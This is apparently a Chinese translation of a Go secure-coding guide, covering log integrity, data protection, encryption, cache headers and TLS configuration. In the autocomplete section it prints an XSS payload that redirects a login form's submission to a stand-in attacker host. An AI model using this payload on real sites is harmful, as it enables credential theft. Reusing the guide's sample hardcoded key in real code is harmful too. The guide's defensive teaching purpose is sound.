\u7684\u4e00\u4e2a\u91cd\u8981\u6ce8\u610f\u4e8b\u9879\u662f\uff1a\u81f4\u547d\u7684\u548c\u7d27\u6025\u7684\u51fd\u6570\u90fd\u6bd4\u65e5\u5fd7\u529f\u80fd\u505a\u5f97\u66f4\u591a\u3002panic\u51fd\u6570\u5728\u5199\u5165\u65e5\u5fd7\u6d88\u606f\u540e\u8c03\u7528panic\u5e93\u901a\u5e38\u4e0d\u63a5\u53d7\u7684\u5185\u5bb9\uff0c\u800c\u81f4\u547d\u7684\u51fd\u6570\u8c03\u7528os\u3002\u5728\u5199\u5165\u65e5\u5fd7\u6d88\u606f\u540e\u9000\u51fa\uff081\uff09\u53ef\u80fd\u7ec8\u6b62\u7a0b\u5e8f\u4ee5\u963b\u6b62\u5ef6\u8fdf\u8bed\u53e5\u8fd0\u884c\u3001\u8981\u5237\u65b0\u7684\u7f13\u51b2\u533a\u548c/\u6216\u8981\u5220\u9664\u7684\u4e34\u65f6\u6570\u636e\u3002 \u4ece\u65e5\u5fd7\u8bbf\u95ee\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u53ea\u6709\u6388\u6743\u7684\u4e2a\u4eba\u624d\u53ef\u4ee5\u8bbf\u95ee\u65e5\u5fd7\u3002\u5f00\u53d1\u4eba\u5458\u8fd8\u5e94\u786e\u4fdd\u8bbe\u7f6e\u4e86\u5141\u8bb8\u65e5\u5fd7\u5206\u6790\u7684\u673a\u5236\uff0c\u5e76\u786e\u4fdd\u4e0d\u53d7\u4fe1\u4efb\u7684\u6570\u636e\u4e0d\u4f1a\u4f5c\u4e3a\u4ee3\u7801\u5728\u9884\u671f\u7684\u65e5\u5fd7\u67e5\u770b\u8f6f\u4ef6\u6216\u754c\u9762\u4e2d\u6267\u884c\u3002 \u5173\u4e8e\u5206\u914d\u7684\u5185\u5b58\u6e05\u7406\uff0cGo\u6709\u4e00\u4e2a\u5185\u7f6e\u7684\u5783\u573e\u6536\u96c6\u5668\u3002 \u4f5c\u4e3a\u786e\u4fdd\u65e5\u5fd7\u6709\u6548\u6027\u548c\u5b8c\u6574\u6027\u7684\u6700\u540e\u4e00\u6b65\uff0c\u5e94\u4f7f\u7528\u52a0\u5bc6\u54c8\u5e0c\u51fd\u6570\u4f5c\u4e3a\u9644\u52a0\u6b65\u9aa4\uff0c\u4ee5\u786e\u4fdd\u4e0d\u4f1a\u53d1\u751f\u65e5\u5fd7\u7be1\u6539\u3002 {...} // Get our known Log checksum from checksum file. logChecksum, err := ioutil.ReadFile( log/checksum ) str := string(logChecksum) // convert content to a 'string' // Compute our current log's MD5 b, err := ComputeMd5( log/log ) if err != nil { fmt.Printf( Err: %v , err) } else { md5Result := hex.EncodeToString(b) // Compare our calculated hash with our stored hash if str == md5Result { // Ok the checksums match. fmt.Println( Log integrity OK. ) } else { // The file integrity has been compromised... fmt.Println( File Tampering detected. ) } } {...} \u6ce8\u610f \uff1a computemd5() \u51fd\u6570\u8ba1\u7b97\u6587\u4ef6\u7684md5\u3002\u540c\u6837\u91cd\u8981\u7684\u662f\uff0c\u5fc5\u987b\u5c06\u65e5\u5fd7\u6587\u4ef6\u54c8\u5e0c\u5b58\u50a8\u5728\u5b89\u5168\u7684\u5730\u65b9\uff0c\u5e76\u4e0e\u5f53\u524d\u65e5\u5fd7\u54c8\u5e0c\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ee5\u5728\u5bf9\u65e5\u5fd7\u8fdb\u884c\u4efb\u4f55\u66f4\u65b0\u4e4b\u524d\u9a8c\u8bc1\u5b8c\u6574\u6027\u3002\u6587\u6863\u4e2d\u5305\u542b\u5b8c\u6574\u7684\u6e90\u4ee3\u7801\u3002 \u6570\u636e\u4fdd\u62a4 \u73b0\u5982\u4eca\uff0c\u5b89\u5168\u4e2d\u6700\u91cd\u8981\u7684\u4e8b\u60c5\u4e4b\u4e00\u5c31\u662f\u6570\u636e\u4fdd\u62a4\u3002\u4f60\u4e0d\u4f1a\u60f3\u8981\uff1a \u7b80\u800c\u8a00\u4e4b\uff0cWeb\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u6570\u636e\u9700\u8981\u53d7\u5230\u4fdd\u62a4\uff0c\u56e0\u6b64\u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u5c06\u7814\u7a76\u4fdd\u62a4\u6570\u636e\u7684\u4e0d\u540c\u65b9\u6cd5\u3002 \u4f60\u5e94\u8be5\u6ce8\u610f\u7684\u7b2c\u4e00\u4ef6\u4e8b\u662f\u4e3a\u6bcf\u4e2a\u7528\u6237\u521b\u5efa\u548c\u5b9e\u73b0\u6b63\u786e\u7684\u6743\u9650\uff0c\u5e76\u5c06\u7528\u6237\u4ec5\u9650\u4e8e\u4ed6\u4eec\u771f\u6b63\u9700\u8981\u7684\u529f\u80fd\u3002 \u4f8b\u5982\uff0c\u8003\u8651\u4e00\u4e2a\u5177\u6709\u4ee5\u4e0b\u7528\u6237\u89d2\u8272\u7684\u7b80\u5355\u5728\u7ebf\u5546\u5e97\uff1a \u9500\u552e\u7528\u6237\uff1a\u53ea\u5141\u8bb8\u67e5\u770b\u76ee\u5f55 \u8425\u9500\u7528\u6237\uff1a\u5141\u8bb8\u67e5\u770b\u7edf\u8ba1\u6570\u636e \u5f00\u53d1\u4eba\u5458\uff1a\u5141\u8bb8\u4fee\u6539\u9875\u9762\u548cweb\u5e94\u7528\u7a0b\u5e8f\u9009\u9879 \u6b64\u5916\uff0c\u5728\u7cfb\u7edf\u914d\u7f6e(\u53c8\u79f0\u4e3aweb\u670d\u52a1\u5668)\u4e2d\uff0c\u5e94\u8be5\u5b9a\u4e49\u6b63\u786e\u7684\u6743\u9650\u3002 \u4e3b\u8981\u662f\u4e3a\u6bcf\u4e2a\u7528\u6237\u5b9a\u4e49\u6b63\u786e\u7684\u89d2\u8272 \u2014\u2014 web\u7528\u6237\u6216\u7cfb\u7edf\u7528\u6237\u3002 \u8bbf\u95ee\u63a7\u5236 \u90e8\u5206\uff0c\u5c06\u8fdb\u4e00\u6b65\u8ba8\u8bba\u89d2\u8272\u5206\u79bb\u548c\u8bbf\u95ee\u63a7\u5236\u3002 \u5220\u9664\u654f\u611f\u4fe1\u606f \u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u4e34\u65f6\u6587\u4ef6\u548c\u7f13\u5b58\u6587\u4ef6\u5e94\u8be5\u5728\u4e0d\u9700\u8981\u65f6\u7acb\u5373\u5220\u9664\u3002\u5982\u679c\u4f60\u4ecd\u7136\u9700\u8981\u5b83\u4eec\u4e2d\u7684\u67d0\u4e9b\u5185\u5bb9\uff0c\u5c06\u5b83\u4eec\u79fb\u5230\u53d7\u4fdd\u62a4\u7684\u533a\u57df\u6216\u5bf9\u5b83\u4eec\u52a0\u5bc6\u3002 \u6ce8\u91ca \u6709\u65f6\u5019\u5f00\u53d1\u4eba\u5458\u4f1a\u5728\u6e90\u4ee3\u7801\u4e2d\u7559\u4e0b\u7c7b\u4f3c\u4e8eTo-do\u5217\u8868\u7684\u6ce8\u91ca\uff0c\u8fd8\u6709\u65f6\u5019\uff0c\u5728\u6700\u574f\u7684\u60c5\u51b5\u4e0b\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u80fd\u4f1a\u7559\u4e0b\u51ed\u8bc1\u3002 // Secret API endpoint - /api/mytoken?callback=myToken fmt.Println( Just a random code ) \u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u5f00\u53d1\u4eba\u5458\u5728\u6ce8\u91ca\u4e2d\u6709\u4e00\u4e2a endpoint \uff0c\u5982\u679c\u6ca1\u6709\u5f97\u5230\u5f88\u597d\u7684\u4fdd\u62a4\uff0c\u5219\u53ef\u80fd\u88ab\u6076\u610f\u7528\u6237\u4f7f\u7528\u3002 URL \u4f7f\u7528HTTP GET\u65b9\u6cd5\u4f20\u9012\u654f\u611f\u4fe1\u606f\u4f1a\u4f7fweb\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u53d7\u5230\u653b\u51fb\uff0c\u56e0\u4e3a\uff1a 1. \u5982\u679c\u4e0d\u4f7f\u7528HTTPS\uff0c\u901a\u8fc7MITM\u653b\u51fb\uff0c\u6570\u636e\u53ef\u80fd\u88ab\u62e6\u622a\u3002 2. \u6d4f\u89c8\u5668\u5386\u53f2\u8bb0\u5f55\u5b58\u50a8\u7528\u6237\u7684\u4fe1\u606f\u3002\u5982\u679cURL\u4e2d\uff0c\u5e26\u6709\u672a\u8fc7\u671f\u7684 session IDs \u3001 pins \u6216 tokens (\u6216\u4f4e\u71b5\u503c)\uff0c\u5219\u5b83\u4eec\u53ef\u80fd\u88ab\u7a83\u53d6\u3002 req, _ := http.NewRequest( GET , http://mycompany.com/api/mytoken?api_key=000s3cr3t000 , nil) \u5982\u679cweb\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u4f60\u7684api_key\u4ece\u7b2c\u4e09\u65b9\u7f51\u7ad9\u83b7\u53d6\u4fe1\u606f\uff0c\u90a3\u4e48\u5982\u679c\u6709\u4eba\u5728\u76d1\u542c\u4f60\u7684\u7f51\u7edc\uff0c\u90a3\u4e48\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4f1a\u88ab\u7a83\u53d6\u3002\u8fd9\u662f\u56e0\u4e3a\u4e0d\u4f7f\u7528HTTPS\u548c\u4f7f\u7528GET\u65b9\u6cd5\u4f20\u9012\u53c2\u6570\u3002 \u6b64\u5916\uff0c\u5982\u679c\u4f60\u7684web\u5e94\u7528\u7a0b\u5e8f\u6709\u6307\u5411\u793a\u4f8b\u7ad9\u70b9\u7684\u94fe\u63a5\uff1a http://mycompany.com/api/mytoken?api_key=000s3cr3t000 \u5b83\u5c06\u5b58\u50a8\u5728\u4f60\u7684\u6d4f\u89c8\u5668\u5386\u53f2\u8bb0\u5f55\u4e2d\uff0c\u56e0\u6b64\uff0c\u5b83\u4e5f\u53ef\u80fd\u88ab\u7a83\u53d6\u3002 \u89e3\u51b3\u65b9\u6848\u662f\uff0c\u5e94\u8be5\u59cb\u7ec8\u4f7f\u7528HTTPS\u3002\u6b64\u5916\uff0c\u5c1d\u8bd5\u4f7f\u7528POST\u65b9\u6cd5\u4f20\u9012\u53c2\u6570\uff0c\u5982\u679c\u53ef\u80fd\u7684\u8bdd\uff0c\u53ea\u4f7f\u7528\u4e00\u6b21\u6027\u7684session id\u6216token\u3002 \u4fe1\u606f\u5c31\u662f\u529b\u91cf \u4f60\u5e94\u8be5\u59cb\u7ec8\u5220\u9664\u751f\u4ea7\u73af\u5883\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u548c\u7cfb\u7edf\u6587\u6863\u3002\u6709\u4e9b\u6587\u6863\u53ef\u80fd\u4f1a\u516c\u5f00\u4e00\u4e9b\u7248\u672c\u6216\u529f\u80fd(\u4f8b\u5982Readme\u3001Changelog\u7b49)\uff0c\u8fd9\u4e9b\u529f\u80fd\u53ef\u4ee5\u88ab\u7528\u6765\u653b\u51fbweb\u5e94\u7528\u7a0b\u5e8f\u3002 \u4f5c\u4e3a\u5f00\u53d1\u4eba\u5458\uff0c\u4f60\u5e94\u8be5\u5141\u8bb8\u7528\u6237\u5220\u9664\u4e0d\u518d\u4f7f\u7528\u7684\u654f\u611f\u4fe1\u606f\u3002\u5047\u8bbe\u7528\u6237\u5e10\u6237\u4e0a\u7684\u4fe1\u7528\u5361\u8fc7\u671f\u4e86\uff0c\u60f3\u8981\u5220\u9664\u5b83\u4eec \u2014 web\u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u5141\u8bb8\u8fd9\u6837\u505a\u3002 \u6240\u6709\u4e0d\u518d\u9700\u8981\u7684\u4fe1\u606f\u5fc5\u987b\u4ece\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5220\u9664\u3002 \u52a0\u5bc6\u662f\u5173\u952e web\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u6bcf\u4e2a\u9ad8\u5ea6\u654f\u611f\u7684\u4fe1\u606f\u90fd\u5e94\u8be5\u52a0\u5bc6\u3002\u4f7f\u7528Go\u4e2d\u63d0\u4f9b\u7684 \u519b\u7528\u7ea7\u52a0\u5bc6 \uff1b\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 \u52a0\u5bc6\u5b9e\u8df5 \u90e8\u5206\u3002 \u5982\u679c\u9700\u8981\u5728\u5176\u4ed6\u5730\u65b9\u6267\u884c\u7684\u7684\u4ee3\u7801\uff0c\u90a3\u4e48\u53ea\u9700\u7f16\u8bd1\u5e76\u5171\u4eab\u4e8c\u8fdb\u5236\u6587\u4ef6 \u2014 \u6ca1\u6709\u53ef\u9760\u7684\u89e3\u51b3\u65b9\u6848\u6765\u9632\u6b62\u9006\u5411\u5de5\u7a0b\u3002 \u83b7\u5f97\u8bbf\u95ee\u4ee3\u7801\u7684\u4e0d\u540c\u6743\u9650\u5e76\u9650\u5236\u6e90\u4ee3\u7801\u7684\u8bbf\u95ee\u662f\u6700\u597d\u7684\u65b9\u6cd5\u3002 \u4e0d\u8981\u5728\u5ba2\u6237\u7aef\u4ee5\u660e\u6587\u6216\u4efb\u4f55\u975e\u52a0\u5bc6\u5b89\u5168\u7684\u65b9\u5f0f\u5b58\u50a8\u5bc6\u7801\u3001\u8fde\u63a5\u5b57\u7b26\u4e32(\u53c2\u89c1\u201c \u6570\u636e\u5b89\u5168 \u90e8\u5206\uff0c\u5982\u4f55\u4fdd\u62a4\u6570\u636e\u5e93\u8fde\u63a5\u5b57\u7b26\u4e32\u7684\u793a\u4f8b\u201d\u4e00\u8282)\u6216\u5176\u4ed6\u654f\u611f\u4fe1\u606f\u3002\u8fd9\u4e9b\u654f\u611f\u4fe1\u606f\u8fd8\u5305\u62ec\u4ee5\u4e0d\u5b89\u5168\u7684\u683c\u5f0f\u5d4c\u5165\u7684\u5185\u5bb9\uff08\u5982Adobe flash\u6216\u5df2\u7f16\u8bd1\u7684\u4ee3\u7801\uff09\u3002 go\u4e2d\uff0c\u4f7f\u7528\u5916\u90e8\u5305 golang.org/x/crypto/nacl/secretboxin \u8fdb\u884c\u52a0\u5bc6\u7684\u5c0f\u4f8b\u5b50\uff1a // Load your secret key from a safe place and reuse it across multiple // Seal calls. (Obviously don't use this example key for anything // real.) If you want to convert a passphrase to a key, use a suitable // package like bcrypt or scrypt. secretKeyBytes, err := hex.DecodeString( 6368616e676520746869732070617373776f726420746f206120736563726574 ) if err != nil { panic(err) } var secretKey [32]byte copy(secretKey[:], secretKeyBytes) // You must use a different nonce for each message you encrypt with the // same key. Since the nonce here is 192 bits long, a random value // provides a sufficiently small probability of repeats. var nonce [24]byte if _, err := rand.Read(nonce[:]); err != nil { panic(err) } // This encrypts hello world and appends the result to the nonce. encrypted := secretbox.Seal(nonce[:], []byte( hello world ), nonce, secretKey) // When you decrypt, you must use the same nonce and key you used to // encrypt the message. One way to achieve this is to store the nonce // alongside the encrypted message. Above, we stored the nonce in the first // 24 bytes of the encrypted text. var decryptNonce [24]byte copy(decryptNonce[:], encrypted[:24]) decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], decryptNonce, secretKey) if !ok { panic( decryption error ) } fmt.Println(string(decrypted)) \u8f93\u51fa\uff1a hello world \u7981\u7528\u4e0d\u9700\u8981\u7684\u5185\u5bb9 \u53e6\u4e00\u79cd\u7b80\u5355\u6709\u6548\u7684\u7f13\u89e3\u653b\u51fb\u7684\u65b9\u6cd5\u662f\u786e\u4fdd\u5728\u7cfb\u7edf\u4e2d\u7981\u7528\u4efb\u4f55\u4e0d\u5fc5\u8981\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u670d\u52a1\u3002 \u81ea\u52a8\u5b8c\u6210 \u6839\u636e Mozilla\u6587\u6863 \uff0c\u60a8\u53ef\u4ee5\u5728\u6574\u4e2a\u8868\u5355\u4e2d\uff0c\u4f7f\u7528\u4ee5\u4e0b\u65b9\u6cd5\u7981\u7528\u81ea\u52a8\u5b8c\u6210\u529f\u80fd\uff1a form method= post action= /form autocomplete= off \u6216\u7279\u5b9a\u7684\u8868\u5355\u5143\u7d20\uff1a input type= text id= cc name= cc autocomplete= off \u8fd9\u5bf9\u4e8e\u5728\u767b\u5f55\u8868\u5355\u4e0a\u7981\u7528\u81ea\u52a8\u5b8c\u6210\u529f\u80fd\u7279\u522b\u6709\u7528\u3002\u5047\u8bbe\u5728\u767b\u5f55\u9875\u9762\u4e2d\u5b58\u5728XSS\u5411\u91cf\u3002\u5982\u679c\u6076\u610f\u7528\u6237\u521b\u5efa\u4e86\u5982\u4e0b\u6709\u6548\u8d1f\u8f7d\uff1a window.setTimeout(function() { document.forms[0].action = 'http://attacker_site.com'; document.forms[0].submit(); } ), 10000); \u5b83\u5c06\u81ea\u52a8\u586b\u5145\u8868\u5355\u5b57\u6bb5\u53d1\u9001\u5230 attacker_site.com \u3002 \u7f13\u5b58 \u9875\u9762\u4e2d\uff0c\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u7f13\u5b58\u63a7\u5236\u5e94\u8be5\u88ab\u7981\u7528\u3002 \u8fd9\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u76f8\u5e94\u7684header\u6807\u5fd7\u6765\u5b9e\u73b0\uff0c\u5982\u4e0b\u9762\u7684\u4ee3\u7801\u7247\u6bb5\u6240\u793a\uff1a w.Header().Set( Cache-Control , no-cache, no-store ) w.Header().Set( Pragma , no-cache ) no-cache \u544a\u8bc9\u6d4f\u89c8\u5668\u5728\u4f7f\u7528\u4efb\u4f55\u7f13\u5b58\u4fe1\u606f\u4e4b\u524d\u4e0e\u670d\u52a1\u5668\u91cd\u65b0\u9a8c\u8bc1\uff08\u9632\u6b62\u4ece\u7f13\u5b58\u4e2d\u83b7\u53d6\u8fc7\u671f\u7684\u8d44\u6e90\uff09\uff0c\u800c\u4e0d\u662f\u544a\u8bc9\u6d4f\u89c8\u5668 \u4e0d\u8981\u7f13\u5b58 \u3002 \u53e6\u4e00\u65b9\u9762\uff0c no-store \u503c\u5b9e\u9645\u4e0a\u662f \u2014 \u505c\u6b62\u7f13\u5b58!\uff0c\u5e76\u4e14\u4e0d\u80fd\u5b58\u50a8\u8bf7\u6c42\u6216\u54cd\u5e94\u7684\u4efb\u4f55\u90e8\u5206\u3002 Pragma \u5934\u7528\u4e8e\u652f\u6301HTTP/1.0\u8bf7\u6c42\u3002 \u901a\u4fe1\u5b89\u5168 \u5728\u8ba8\u8bba\u901a\u4fe1\u5b89\u5168\u6027\u65f6\uff0c\u5f00\u53d1\u4eba\u5458\u5e94\u8be5\u786e\u4fdd\u7528\u4e8e\u901a\u4fe1\u7684\u901a\u9053\u662f\u5b89\u5168\u7684\u3002\u901a\u4fe1\u7c7b\u578b\u5305\u62ec\u670d\u52a1\u5668-\u5ba2\u6237\u7aef\u3001\u670d\u52a1\u5668-\u6570\u636e\u5e93\u4ee5\u53ca\u6240\u6709\u540e\u7aef\u901a\u4fe1\u3002\u8fd9\u4e9b\u6570\u636e\u5fc5\u987b\u52a0\u5bc6\uff0c\u4ee5\u4fdd\u8bc1\u6570\u636e\u7684\u5b8c\u6574\u6027\uff0c\u5e76\u9632\u6b62\u4e0e\u901a\u4fe1\u5b89\u5168\u76f8\u5173\u7684\u5e38\u89c1\u653b\u51fb\u3002\u5982\u679c\u4e0d\u80fd\u4fdd\u8bc1\u8fd9\u4e9b\u901a\u9053\u7684\u5b89\u5168\uff0c\u5c31\u4f1a\u53d1\u751f\u50cfMITM\u8fd9\u6837\u7684\u653b\u51fb\uff0c\u8ba9\u72af\u7f6a\u5206\u5b50\u62e6\u622a\u5e76\u8bfb\u53d6\u8fd9\u4e9b\u901a\u9053\u4e2d\u7684\u6d41\u91cf\u3002 \u672c\u8282\u6db5\u76d6\u4ee5\u4e0b\u901a\u8baf\u6e20\u9053: - HTTP/TLS - Websockets HTTP/TLS TLS/SSL\u662f\u4e00\u79cd\u52a0\u5bc6\u534f\u8bae\uff0c\u5b83\u5141\u8bb8\u5728\u5176\u4ed6\u4e0d\u5b89\u5168\u7684\u901a\u4fe1\u901a\u9053\u4e0a\u8fdb\u884c\u52a0\u5bc6\u3002\u5b83\u6700\u5e38\u89c1\u7684\u7528\u9014\u662f\u63d0\u4f9b\u5b89\u5168\u7684HTTP\u901a\u4fe1\uff0c\u4e5f\u79f0\u4e3aHTTPS\u3002\u8be5\u534f\u8bae\u786e\u4fdd\u4ee5\u4e0b\u5c5e\u6027\u9002\u7528\u4e8e\u901a\u4fe1\u901a\u9053: \u9690\u79c1 \u8eab\u4efd\u9a8c\u8bc1 \u6570\u636e\u5b8c\u6574\u6027 \u5b83\u5728Go\u4e2d\u7684\u5b9e\u73b0\u5728 crypto/tls \u5305\u4e2d\u3002\u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u5c06\u91cd\u70b9\u4ecb\u7ecdGo\u7684\u5b9e\u73b0\u548c\u7528\u6cd5\u3002\u867d\u7136\u534f\u8bae\u8bbe\u8ba1\u7684\u7406\u8bba\u90e8\u5206\u548c\u5b83\u7684\u52a0\u5bc6\u5b9e\u8df5\u8d85\u51fa\u4e86\u672c\u6587\u7684\u8303\u56f4\uff0c\u4f46\u662f\u672c\u6587\u6863\u7684 \u52a0\u5bc6\u5b9e\u8df5 \u90e8\u5206\u8fd8\u662f\u63d0\u4f9b\u4e86\u66f4\u591a\u4fe1\u606f\u3002 \u4ee5\u4e0b\u662f\u4f7f\u7528TLS\u7684HTTP\u7684\u7b80\u5355\u793a\u4f8b\uff1a import log import net/http func main() { http.HandleFunc( / , func (w http.ResponseWriter, req *http.Request) { w.Write([]byte( This is an example server.\\n )) }) // yourCert.pem - path to your server certificate in PEM format // yourKey.pem - path to your server private key in PEM format log.Fatal(http.ListenAndServeTLS( :443 , yourCert.pem , yourKey.pem , nil)) } \u8fd9\u662f\u4e00\u4e2a\uff0c\u5728\u7528Go\u5b9e\u73b0\u7684web\u670d\u52a1\u5668\u4e2d\uff0c\u7b80\u5355\u7684\u5f00\u7bb1\u5373\u7528\u7684SSL\u5b9e\u73b0\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u793a\u4f8b\u5728SSL\u5b9e\u9a8c\u5ba4\u4e2d\u83b7\u5f97\u4e86\u201cA\u201d\u3002 \u4e3a\u4e86\u8fdb\u4e00\u6b65\u63d0\u9ad8\u901a\u4fe1\u5b89\u5168\uff0c\u53ef\u4ee5\u5728header\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u6807\u5fd7\uff0c\u4ee5\u5f3a\u5236\u6267\u884cHSTS (HTTP\u4e25\u683c\u4f20\u8f93\u5b89\u5168)\uff1a w.Header().Add( Strict-Transport-Security , max-age=63072000; includeSubDomains ) Go\u7684TLS\u5b9e\u73b0\u5728crypto/ TLS\u5305\u4e2d\u3002\u5728\u4f7f\u7528TLS\u65f6\uff0c\u8bf7\u786e\u4fdd\u4f7f\u7528\u4e86\u5355\u4e2a\u6807\u51c6TLS\u5b9e\u73b0\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c\u4e86\u9002\u5f53\u7684\u914d\u7f6e\u3002 \u57fa\u4e8e\u524d\u9762\u7684\u4f8b\u5b50\u5b9e\u73b0SNI\uff08Server Name Indication\uff09\uff1a ... type Certificates struct { CertFile string KeyFile string } func main() { httpsServer := http.Server{ Addr: :8080 , } var certs []Certificates certs = append(certs, Certificates{ CertFile: ../etc/yourSite.pem , //Your site certificate key KeyFile: ../etc/yourSite.key , //Your site private key }) config := tls.Config{} var err error config.Certificates = make([]tls.Certificate, len(certs)) for i, v := range certs { config.Certificates[i], err = tls.LoadX509KeyPair(v.CertFile, v.KeyFile) } conn, err := net.Listen( tcp , :8080 ) tlsListener := tls.NewListener(conn, config) httpsServer.Serve(tlsListener) fmt.Println( Listening on port 8080... ) } \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4f7f\u7528TLS\u65f6\uff0c\u8bc1\u4e66\u5e94\u8be5\u662f\u6709\u6548\u7684\uff0c\u62e5\u6709\u6b63\u786e\u7684\u57df\u540d\uff0c\u4e0d\u5e94\u8be5\u8fc7\u671f\uff0c\u5e76\u4e14\u5e94\u8be5\u5728\u9700\u8981\u65f6\u5b89\u88c5\u4e2d\u95f4\u8bc1\u4e66\uff0c\u5982 OWASP SCP\u5feb\u901f\u53c2\u8003\u6307\u5357 \u6240\u5efa\u8bae\u7684\u90a3\u6837\u3002 \u91cd\u8981\u63d0\u793a \uff1a\u65e0\u6548\u7684TLS\u8bc1\u4e66\u5e94\u8be5\u59cb\u7ec8\u88ab\u62d2\u7edd\u3002\u786e\u4fdd\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u6ca1\u6709\u5c06InsecureSkipVerify\u914d\u7f6e\u8bbe\u7f6e\u4e3atrue\u3002 \u4ee5\u4e0b\u4ee3\u7801\u6bb5\u662f\u5982\u4f55\u8bbe\u7f6e\u7684\u793a\u4f8b\uff1a config := tls.Config{InsecureSkipVerify: false} \u4f7f\u7528\u6b63\u786e\u7684\u4e3b\u673a\u540d\u4ee5\u8bbe\u7f6e\u670d\u52a1\u5668\u540d\u79f0\uff1a config := tls.Config{ServerName: yourHostname } \u53e6\u4e00\u79cd\u5df2\u77e5\u7684TLS\u653b\u51fb\u88ab\u79f0\u4e3aPOODLE\u3002 \u5f53\u5ba2\u6237\u7aef\u4e0d\u652f\u6301\u670d\u52a1\u5668\u7684\u5bc6\u7801\u65f6\uff0c\u5b83\u4e0eTLS\u8fde\u63a5\u56de\u9000\u6709\u5173\u3002 \u8fd9\u5141\u8bb8\u5c06\u8fde\u63a5\u964d\u7ea7\u4e3a\u6613\u53d7\u653b\u51fb\u7684\u5bc6\u7801\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cGo\u7981\u7528SSLv3\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u914d\u7f6e\uff0c\u6765\u8bbe\u7f6e\u5bc6\u7801\u7684\u6700\u5c0f\u7248\u672c\u548c\u6700\u5927\u7248\u672c\uff1a // MinVersion contains the minimum SSL/TLS version that is acceptable. // If zero, then TLS 1.0 is taken as the minimum. MinVersion uint16 // MaxVersion contains the maximum SSL/TLS version that is acceptable. // If zero, then the maximum version supported by this package is used, // which is currently TLS 1.2. MaxVersion uint16 \u53ef\u4ee5\u901a\u8fc7 SSL\u5b9e\u9a8c\u5ba4 \uff0c\u6765\u68c0\u67e5\uff0c\u4f7f\u7528\u7684\u5bc6\u7801\u7684\u5b89\u5168\u6027\u3002 \u4e00\u4e2a\u901a\u5e38\u7528\u4e8e\u51cf\u8f7b\u964d\u7ea7\u653b\u51fb\u7684\u9644\u52a0\u6807\u5fd7\uff0c\u662fRFC7507\u4e2d\u5b9a\u4e49\u7684TLS_FALLBACK_SCSV\u3002 \u5728Go\u4e2d\uff0c\u6ca1\u6709\u56de\u9000\u3002 \u5f15\u7528Google\u5f00\u53d1\u8005Adam Langley\u7684\u8bdd\uff1a Go\u5ba2\u6237\u7aef\u4e0d\u6267\u884c\u56de\u9000\uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u53d1\u9001TLS_FALLBACK_SCSV\u3002 \u53e6\u4e00\u79cd\u79f0\u4e3aCRIME\u7684\u653b\u51fb\u4f1a\u5f71\u54cd\u4f7f\u7528\u538b\u7f29\u7684TLS\u4f1a\u8bdd\u3002 \u538b\u7f29\u662f\u6838\u5fc3\u534f\u8bae\u7684\u4e00\u90e8\u5206\uff0c\u4f46\u5b83\u662f\u53ef\u9009\u7684\u3002\u7528Go\u8bed\u8a00\u7f16\u5199\u7684\u7a0b\u5e8f\u53ef\u80fd\u5e76\u4e0d\u5bb9\u6613\u53d7\u5230\u653b\u51fb\uff0c\u539f\u56e0\u5f88\u7b80\u5355\uff0c\u56e0\u4e3a\u76ee\u524d crypto/tls \u4e0d\u652f\u6301\u538b\u7f29\u673a\u5236\u3002\u4e00\u4e2a\u9700\u8981\u8bb0\u4f4f\u7684\u91cd\u8981\u6ce8\u610f\u4e8b\u9879\u662f\uff0c\u5982\u679cGo\u5305\u88c5\u5668\u7528\u4e8e\u5916\u90e8\u5b89\u5168\u5e93\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u5f88\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002 TLS\u7684\u53e6\u4e00\u90e8\u5206\u4e0e\u91cd\u65b0\u534f\u5546\u8fde\u63a5\u6709\u5173\u3002\u4e3a\u4e86\u786e\u4fdd\u6ca1\u6709\u5efa\u7acb\u4e0d\u5b89\u5168\u7684\u8fde\u63a5\uff0c\u8bf7\u4f7f\u7528 GetClientCertificate \u53ca\u5176\u76f8\u5173\u7684\u9519\u8bef\u4ee3\u7801\uff0c\u4ee5\u9632\u63e1\u624b\u7ec8\u6b62\u3002\u53ef\u4ee5\u6355\u83b7\u9519\u8bef\u4ee3\u7801\u4ee5\u9632\u6b62\u4f7f\u7528\u4e0d\u5b89\u5168\u7684\u901a\u9053\u3002 \u6240\u6709\u8bf7\u6c42\u4e5f\u5e94\u7f16\u7801\u4e3a\u9884\u5b9a\u7684\u5b57\u7b26\u7f16\u7801\uff0c\u4f8b\u5982UTF-8\u3002 \u8fd9\u53ef\u4ee5\u5728header\u4e2d\u8bbe\u7f6e\uff1a w.Header().Set( Content-Type , Desired Content Type; charset=utf-8 ) 